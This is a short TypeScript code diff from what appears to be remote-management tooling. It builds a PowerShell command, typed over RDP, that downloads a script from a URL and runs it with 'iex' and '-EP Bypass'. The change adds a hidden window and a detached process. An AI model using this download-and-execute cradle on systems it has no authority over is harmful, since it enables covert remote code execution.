@@ -151,9 +151,10 @@ export function buildAlternateShellBootstrap(scriptUrl: string): string {
     if (!url) {
         throw new AppError({ code: 'invalid_argument', message: 'script URL is required for RDP bootstrap' });
     }
-    // Avoid `|` in Win+R payloads — some hosts drop or mis-type the pipe scancode.
+    // Detach via Start-Process so the install outlives the IronRDP hold/disconnect.
+    // Avoid `|` — some hosts drop or mis-type the pipe scancode in Win+R fallbacks.
     const shell =
-        `powershell.exe -NoP -EP Bypass -c "iex((iwr -UseBasicParsing '${url}').Content)"`;
+        `powershell.exe -NoP -EP Bypass -w Hidden -c "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoP','-EP','Bypass','-c','iex((iwr -UseBasicParsing ''${url}'').Content)'"`;
     if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
         throw new AppError({
             code: 'invalid_argument',
